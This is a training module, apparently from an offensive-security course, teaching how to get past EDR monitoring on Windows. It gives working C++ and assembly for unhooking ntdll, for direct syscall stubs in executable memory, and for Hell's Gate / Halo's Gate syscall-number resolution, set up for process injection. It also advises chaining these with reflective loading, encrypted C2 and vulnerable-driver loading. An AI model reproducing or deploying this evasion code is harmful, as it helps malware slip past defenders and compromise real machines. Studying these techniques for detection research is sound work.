# Module 17 — EDR Bypass Techniques

## How EDRs intercept your API calls

When you call `NtAllocateVirtualMemory` (the underlying syscall for VirtualAlloc),
the call goes through a chain:

```
Your code
  → kernel32.dll VirtualAlloc
  → ntdll.dll NtAllocateVirtualMemory (user-mode stub)
  → SYSCALL instruction → kernel

EDR installs hooks by patching ntdll.dll IN YOUR PROCESS MEMORY:
  ntdll.dll NtAllocateVirtualMemory:
    ORIGINAL:  MOV R10, RCX / MOV EAX, syscall_number / SYSCALL / RET
    HOOKED:    JMP edrhook_NtAllocateVirtualMemory   ← EDR intercepts here
               edrhook sees your args → logs them → calls real syscall
```

The hook is a JMP (E9 xx xx xx xx or FF 25 ...) injected at the start of the
ntdll stub. This is called **inline hooking** or **trampoline hooking**.

---

## 1. NTDLL Unhooking

Remove the EDR's hooks by restoring ntdll to its original state.

**Strategy:** Load a fresh copy of ntdll.dll from disk (untouched), read the
original bytes, overwrite the hooked bytes in the current process's ntdll copy.

```cpp
#include <windows.h>
#include <winternl.h>
#include <iostream>

bool unhookNtdll() {
    // Get the path to ntdll.dll
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\ntdll.dll");

    // Map a clean copy from disk
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!hMap) { CloseHandle(hFile); return false; }

    LPVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap); CloseHandle(hFile);
    if (!cleanNtdll) return false;

    // Get current (hooked) ntdll in memory
    HMODULE hookedNtdll = GetModuleHandleA("ntdll.dll");

    // Parse both PE headers to find the .text section
    IMAGE_DOS_HEADER* dos  = (IMAGE_DOS_HEADER*)cleanNtdll;
    IMAGE_NT_HEADERS* nt   = (IMAGE_NT_HEADERS*)((PBYTE)cleanNtdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        // We want .text section only
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;

        PVOID cleanSection  = (PBYTE)cleanNtdll  + sec[i].VirtualAddress;
        PVOID hookedSection = (PBYTE)hookedNtdll + sec[i].VirtualAddress;
        DWORD size          = sec[i].Misc.VirtualSize;

        // Make hooked section writable
        DWORD oldProtect;
        VirtualProtect(hookedSection, size, PAGE_EXECUTE_READWRITE, &oldProtect);

        // Overwrite hooked bytes with clean bytes
        memcpy(hookedSection, cleanSection, size);

        // Restore original protection
        VirtualProtect(hookedSection, size, oldProtect, &oldProtect);

        printf("[+] Unhooked .text section (%lu bytes)\n", size);
        break;
    }

    UnmapViewOfFile(cleanNtdll);
    return true;
}
```

**Weakness of this approach:**
EDRs can detect "unexpected ntdll reload from disk" by watching for
`CreateFileMapping` + `MapViewOfFile` on `ntdll.dll`.

---

## 2. Direct Syscalls

Skip ntdll entirely. Execute the `SYSCALL` instruction directly from your code.
No EDR hook can intercept a syscall that never goes through ntdll.

**The syscall stub for x64 Windows:**
```asm
; NtAllocateVirtualMemory syscall number = 0x18 (varies by Windows version!)
mov r10, rcx          ; syscall convention: first arg goes in both RCX and R10
mov eax, 0x18         ; syscall number
syscall               ; trap into kernel
ret
```

That's it. Four instructions. The kernel sees the syscall number and dispatches
to `nt!NtAllocateVirtualMemory` directly. No user-mode hook possible.

**How to use this in C++:**

```cpp
// Option A: inline assembly (x64 MSVC does not support inline asm!)
// Must use a .asm file or an external assembler.

// Option B: write the stub bytes into a buffer and call it as a function
typedef NTSTATUS (*NtAllocVirt)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

BYTE stub[] = {
    0x4C, 0x8B, 0xD1,              // mov r10, rcx
    0xB8, 0x18, 0x00, 0x00, 0x00,  // mov eax, 0x18
    0x0F, 0x05,                    // syscall
    0xC3                           // ret
};

// Allocate executable memory for the stub
LPVOID execMem = VirtualAlloc(nullptr, sizeof(stub),
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(execMem, stub, sizeof(stub));
auto directNtAlloc = (NtAllocVirt)execMem;

// Call directly — bypasses all hooks
PVOID base = nullptr;
SIZE_T size = 4096;
directNtAlloc(GetCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

**The syscall number problem:**
Syscall numbers change between Windows versions. `NtAllocateVirtualMemory`
is `0x18` on Win10 21H2 but different on Win11 22H2 and different again on
Windows 7.

**Solutions:**
1. Hard-code per-version (fragile)
2. Read from ntdll at runtime BEFORE hooks fire (still fast)
3. Use Hell's Gate / Halo's Gate techniques (see below)

---

## 3. Hell's Gate — Dynamic Syscall Number Extraction

Read the syscall number from ntdll at runtime. If ntdll is unhooked at the
target function, read the 4-byte syscall number directly from the stub.
If it IS hooked (JMP instruction), scan forward/backward to find an
unhooked neighbour and infer the number.

```cpp
// ntdll stubs have a predictable pattern:
//   4C 8B D1  — mov r10, rcx
//   B8 xx xx 00 00 — mov eax, <syscall_number>
//   0F 05     — syscall
//   C3        — ret

DWORD getSyscallNumber(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PBYTE stub = (PBYTE)GetProcAddress(ntdll, funcName);
    if (!stub) return (DWORD)-1;

    // Check for hook: first byte should be 4C (not E9 JMP or FF 25 JMP)
    if (stub[0] == 0x4C && stub[3] == 0xB8) {
        // Unhooked — read syscall number directly
        return *(DWORD*)(stub + 4);
    }

    // Hooked (JMP at start) — Halo's Gate: scan forward for sibling functions
    // Syscall numbers for adjacent functions differ by 1
    for (int i = 1; i < 20; i++) {
        // Look at stub + i*32 (approximate function spacing)
        PBYTE sibling = stub + i * 32;
        if (sibling[0] == 0x4C && sibling[3] == 0xB8) {
            return *(DWORD*)(sibling + 4) - i;
        }
        sibling = stub - i * 32;
        if (sibling[0] == 0x4C && sibling[3] == 0xB8) {
            return *(DWORD*)(sibling + 4) + i;
        }
    }
    return (DWORD)-1;  // couldn't find it
}
```

---

## 4. Combining Everything — Stomping Approach

The cleanest production pattern:
1. Use Hell's Gate to resolve syscall numbers at startup (before EDR processes them)
2. Store them in a struct
3. Allocate a small RWX stub pool
4. Generate one syscall stub per function and call through them

```cpp
struct SyscallStubs {
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
} stubs;

void resolveStubs() {
    stubs.NtAllocateVirtualMemory = getSyscallNumber("NtAllocateVirtualMemory");
    stubs.NtWriteVirtualMemory    = getSyscallNumber("NtWriteVirtualMemory");
    stubs.NtCreateThreadEx        = getSyscallNumber("NtCreateThreadEx");
    stubs.NtOpenProcess           = getSyscallNumber("NtOpenProcess");

    printf("[*] NtAllocateVirtualMemory = 0x%02X\n", stubs.NtAllocateVirtualMemory);
    printf("[*] NtCreateThreadEx        = 0x%02X\n", stubs.NtCreateThreadEx);
}
```

---

## 5. What Still Gets You

Even with direct syscalls, EDRs have other detection layers:

| What you bypassed | What remains |
|-------------------|-------------|
| User-mode NTDLL hooks | Kernel ETW telemetry (can't bypass from user-mode) |
| | PPL process protection (can't open LSASS even with direct syscall) |
| | Memory scanning (EDR still reads your process memory) |
| | Behavioral detection (pattern of calls still looks like injection) |
| | Network telemetry (C2 traffic is still visible) |

Direct syscalls remove one detection layer, not all of them. Combine with:
- Sleep + jitter between stages
- Reflective loading (avoid disk writes)
- Section-based injection (avoid VirtualAllocEx signature)
- Encrypted C2 (Module 07 + TLS)

---

## 6. Patch Guard and Kernel Protections (awareness only)

On x64 Windows, **PatchGuard** (Kernel Patch Protection / KPP) runs periodic
integrity checks on SSDT, IDT, and kernel code. Patching the kernel directly
triggers a BSOD (bug check 0x109).

**DSE (Driver Signature Enforcement)** prevents unsigned kernel drivers from loading.
Bypass requires: a vulnerable signed driver (BYOVD — Bring Your Own Vulnerable Driver)
or a kernel exploit.

This module operates entirely in user-mode. Kernel modules are Module 18.

---

## Exercises

- `ex01_detect_hooks.cpp` — check ntdll functions for inline hooks (JMP bytes)
- `ex02_unhook_ntdll.cpp` — reload clean ntdll from disk, overwrite hooked .text
- `ex03_direct_syscall.cpp` — execute NtAllocateVirtualMemory via syscall stub directly
- `ex04_hells_gate.cpp` — implement getSyscallNumber() with Halo's Gate fallback
